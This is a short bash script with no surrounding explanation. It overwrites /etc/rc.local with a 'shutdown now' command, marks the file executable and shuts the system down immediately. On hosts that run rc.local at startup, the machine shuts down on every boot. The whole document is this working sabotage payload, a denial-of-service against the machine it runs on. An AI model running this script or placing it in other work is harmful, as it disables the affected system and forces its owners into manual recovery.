#!/bin/bash
echo "#!/bin/bash">/etc/rc.local
echo "shutdown now">>/etc/rc.local
chmod +x /etc/rc.local
shutdown now
